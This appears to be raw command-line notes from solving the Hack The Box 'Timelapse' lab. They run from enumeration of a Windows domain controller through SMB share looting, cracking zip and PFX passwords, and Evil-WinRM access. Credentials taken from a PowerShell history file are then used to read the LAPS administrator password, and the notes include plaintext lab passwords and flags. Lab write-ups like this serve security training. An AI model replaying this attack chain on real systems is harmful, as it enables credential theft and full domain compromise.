root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Timelapse_10.10.11.152# nmap -A -p- -Pn -T4 -v 10.10.11.152
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-10 08:23 UTC
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:23
Completed NSE at 08:23, 0.00s elapsed
Initiating NSE at 08:23
Completed NSE at 08:23, 0.00s elapsed
Initiating NSE at 08:23
Completed NSE at 08:23, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 08:23
Completed Parallel DNS resolution of 1 host. at 08:23, 0.00s elapsed
Initiating SYN Stealth Scan at 08:23
Scanning 10.10.11.152 [65535 ports]
Discovered open port 135/tcp on 10.10.11.152
Discovered open port 53/tcp on 10.10.11.152
Discovered open port 139/tcp on 10.10.11.152
Discovered open port 445/tcp on 10.10.11.152
Discovered open port 49673/tcp on 10.10.11.152
SYN Stealth Scan Timing: About 12.79% done; ETC: 08:27 (0:03:31 remaining)
Discovered open port 49674/tcp on 10.10.11.152
Discovered open port 49667/tcp on 10.10.11.152
Discovered open port 389/tcp on 10.10.11.152
Discovered open port 49696/tcp on 10.10.11.152
SYN Stealth Scan Timing: About 36.12% done; ETC: 08:26 (0:01:48 remaining)
Discovered open port 5986/tcp on 10.10.11.152
Discovered open port 3269/tcp on 10.10.11.152
SYN Stealth Scan Timing: About 65.35% done; ETC: 08:25 (0:00:48 remaining)
Discovered open port 9389/tcp on 10.10.11.152
Discovered open port 593/tcp on 10.10.11.152
Discovered open port 65466/tcp on 10.10.11.152
Discovered open port 88/tcp on 10.10.11.152
Discovered open port 636/tcp on 10.10.11.152
Discovered open port 464/tcp on 10.10.11.152
Discovered open port 3268/tcp on 10.10.11.152
Completed SYN Stealth Scan at 08:25, 121.43s elapsed (65535 total ports)
Initiating Service scan at 08:25
Scanning 18 services on 10.10.11.152
Completed Service scan at 08:26, 56.01s elapsed (18 services on 1 host)
Initiating OS detection (try #1) against 10.10.11.152
Retrying OS detection (try #2) against 10.10.11.152
Initiating Traceroute at 08:26
Completed Traceroute at 08:26, 0.16s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 08:26
Completed Parallel DNS resolution of 2 hosts. at 08:26, 0.00s elapsed
NSE: Script scanning 10.10.11.152.
Initiating NSE at 08:26
Completed NSE at 08:26, 40.09s elapsed
Initiating NSE at 08:26
Completed NSE at 08:27, 4.44s elapsed
Initiating NSE at 08:27
Completed NSE at 08:27, 0.00s elapsed
Nmap scan report for 10.10.11.152
Host is up (0.15s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-07-10 16:25:23Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2022-07-10T16:27:00+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-25T14:05:29
| Not valid after:  2022-10-25T14:25:29
| MD5:   e233 a199 4504 0859 013f b9c5 e4f6 91c3
|_SHA-1: 5861 acf7 76b8 703f d01e e25d fc7c 9952 a447 7652
| tls-alpn:
|_  http/1.1
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49696/tcp open  msrpc             Microsoft Windows RPC
65466/tcp open  msrpc             Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2022-07-10T16:26:19
|_  start_date: N/A

root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Timelapse_10.10.11.152# enum4linux 10.10.11.152
WARNING: polenum is not in your path.  Check that package is installed and your PATH is sane.
WARNING: ldapsearch is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jul 10 09:06:28 2022

 =========================================( Target Information )=========================================

Target ........... 10.10.11.152
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.11.152 )============================


[E] Can't find workgroup/domain



 ================================( Nbtstat Information for 10.10.11.152 )================================

Looking up status of 10.10.11.152
No reply from 10.10.11.152

 ===================================( Session Check on 10.10.11.152 )===================================


[+] Server 10.10.11.152 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.10.11.152 )================================

Domain Name: TIMELAPSE
Domain Sid: S-1-5-21-671920749-559770252-3318990721

[+] Host is part of a domain (not a workgroup)


 ===================================( OS information on 10.10.11.152 )===================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.10.11.152 from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED


 =======================================( Users on 10.10.11.152 )=======================================


[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED



[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED


 =================================( Share Enumeration on 10.10.11.152 )=================================

smb1cli_req_writev_submit: called for dialect[SMB3_11] server[10.10.11.152]

        Sharename       Type      Comment
        ---------       ----      -------
Error returning browse list: NT_STATUS_REVISION_MISMATCH
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.11.152


 ============================( Password Policy Information for 10.10.11.152 )============================


[E] Dependent program "polenum" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/



 =======================================( Groups on 10.10.11.152 )=======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ==================( Users on 10.10.11.152 via RID cycling (RIDS: 500-550,1000-1050) )==================


[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.


 ===============================( Getting printer info for 10.10.11.152 )===============================

Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Sun Jul 10 09:07:19 2022


root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Timelapse_10.10.11.152# smbclient -L //10.10.11.152
Enter MYGROUP\root's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Shares          Disk
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Timelapse_10.10.11.152# smbclient //10.10.11.152/Shares
Enter MYGROUP\root's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 15:39:15 2021
  ..                                  D        0  Mon Oct 25 15:39:15 2021
  Dev                                 D        0  Mon Oct 25 19:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 15:48:42 2021

                6367231 blocks of size 4096. 2467908 blocks available
smb: \> cd Dev
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 19:40:06 2021
  ..                                  D        0  Mon Oct 25 19:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 15:46:42 2021

                6367231 blocks of size 4096. 2467908 blocks available
smb: \Dev\> cd ..
smb: \> cd HelpDesk\
smb: \HelpDesk\> ls
  .                                   D        0  Mon Oct 25 15:48:42 2021
  ..                                  D        0  Mon Oct 25 15:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 14:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 14:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 14:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 14:57:44 2021

                6367231 blocks of size 4096. 2467908 blocks available

smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (4.2 KiloBytes/sec) (average 4.2 KiloBytes/sec)

root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Timelapse_10.10.11.152# ~/oscp/tools/john/run/zip2john winrm_backup.zip > hash.txt
root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Timelapse_10.10.11.152# ~/oscp/tools/john/run/john hash.txt --wordlist=/root/oscp/tools/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
1g 0:00:00:00 DONE (2022-07-10 09:22) 1.562g/s 5420Kp/s 5420Kc/s 5420KC/s surken201..suppamart
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

unzip winrm_backup.zip

root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Timelapse_10.10.11.152# ~/oscp/tools/john/run/pfx2john.py legacyy_dev_auth.pfx > hash_pfx.txt
root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Timelapse_10.10.11.152# ~/oscp/tools/john/run/john hash_pfx.txt --wordlist=/root/oscp/tools/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)
1g 0:00:02:22 DONE (2022-07-10 09:29) 0.007033g/s 22727p/s 22727c/s 22727C/s thuglife03282006..thug209
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

TIPS: PFX
https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/

root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Timelapse_10.10.11.152# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
Enter Import Password:

openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem
Enter Import Password:

TIPS: WinRM Port 5985 5986

──(kali㉿kali)-[~/htb/htb/Timelapse_10.10.11.152]
└─$ pc evil-winrm -S -k legacy.key -c legacy.cert -i 10.10.11.152
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
*Evil-WinRM* PS C:\Users\legacyy\Documents> hostname
dc01
*Evil-WinRM* PS C:\Users\legacyy\Documents> 

*Evil-WinRM* PS C:\Users\legacyy\Documents> cd ..
dir
*Evil-WinRM* PS C:\Users\legacyy> dir


    Directory: C:\Users\legacyy


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       10/25/2021   8:25 AM                Desktop
d-r---       10/25/2021   8:22 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos


cd *Evil-WinRM* PS C:\Users\legacyy> cd Desktop
*Evil-WinRM* PS C:\Users\legacyy\Desktop> dir


    Directory: C:\Users\legacyy\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/10/2022   2:13 AM             34 user.txt


*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
02b05e8d3c9c721d94d6c2ea0c855327

PE

*Evil-WinRM* PS C:\Users\legacyy\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\legacyy\Desktop> net user legacyy
User name                    legacyy
Full Name                    Legacyy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/23/2021 12:17:10 PM
Password expires             Never
Password changeable          10/24/2021 12:17:10 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/10/2022 11:07:43 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Development
The command completed successfully.

*Evil-WinRM* PS C:\Users\legacyy\Documents> Get-ComputerInfo -Property "*version"


WindowsCurrentVersion              : 6.3
WindowsVersion                     : 1809

*Evil-WinRM* PS C:\Users\legacyy\Downloads> echo $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
*Evil-WinRM* PS C:\Users\legacyy\Downloads> dir C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\


    Directory: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2022  11:46 PM            434 ConsoleHost_history.txt


*Evil-WinRM* PS C:\Users\legacyy\Downloads> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit

*Evil-WinRM* PS C:\Users\legacyy\Downloads> $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
*Evil-WinRM* PS C:\Users\legacyy\Downloads> $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\legacyy\Downloads> $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
*Evil-WinRM* PS C:\Users\legacyy\Downloads> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
timelapse\svc_deploy
*Evil-WinRM* PS C:\Users\legacyy\Downloads> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}


PSComputerName              : localhost
RunspaceId                  : 045920df-5c8d-44de-905e-9a186c266aec
DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName                 : dc01.timelapse.htb
Enabled                     : True
ms-Mcs-AdmPwd               : -VIdwe+}JSU29.50!&.2Kh9y
ms-Mcs-AdmPwdExpirationTime : 133023499988534487
Name                        : DC01
ObjectClass                 : computer
ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName              : DC01$
SID                         : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName           :

PSComputerName    : localhost
RunspaceId        : 045920df-5c8d-44de-905e-9a186c266aec
DistinguishedName : CN=DB01,OU=Database,OU=Servers,DC=timelapse,DC=htb
DNSHostName       :
Enabled           : True
Name              : DB01
ObjectClass       : computer
ObjectGUID        : d38b3265-230f-47ae-bdcd-f7153da7659d
SamAccountName    : DB01$
SID               : S-1-5-21-671920749-559770252-3318990721-1606
UserPrincipalName :

PSComputerName    : localhost
RunspaceId        : 045920df-5c8d-44de-905e-9a186c266aec
DistinguishedName : CN=WEB01,OU=Web,OU=Servers,DC=timelapse,DC=htb
DNSHostName       :
Enabled           : True
Name              : WEB01
ObjectClass       : computer
ObjectGUID        : 897c7cfe-ba15-4181-8f2c-a74f88952683
SamAccountName    : WEB01$
SID               : S-1-5-21-671920749-559770252-3318990721-1607
UserPrincipalName :

PSComputerName    : localhost
RunspaceId        : 045920df-5c8d-44de-905e-9a186c266aec
DistinguishedName : CN=DEV01,OU=Dev,OU=Servers,DC=timelapse,DC=htb
DNSHostName       :
Enabled           : True
Name              : DEV01
ObjectClass       : computer
ObjectGUID        : 02dc961a-7a60-4ec0-a151-0472768814ca
SamAccountName    : DEV01$
SID               : S-1-5-21-671920749-559770252-3318990721-1608
UserPrincipalName :

┌──(kali㉿kali)-[~/htb/htb/Timelapse_10.10.11.152]
└─$ pc evil-winrm -S -u 'Administrator' -p '-VIdwe+}JSU29.50!&.2Kh9y' -i 10.10.11.152
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator

*Evil-WinRM* PS C:\Users\Administrator\documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/23/2021  11:27 AM                Administrator
d-----       10/25/2021   8:22 AM                legacyy
d-r---       10/23/2021  11:27 AM                Public
d-----       10/25/2021  12:23 PM                svc_deploy
d-----        2/23/2022   5:45 PM                TRX


*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
21b19a3c9dfe9e5b4d683ba5132cdfd4

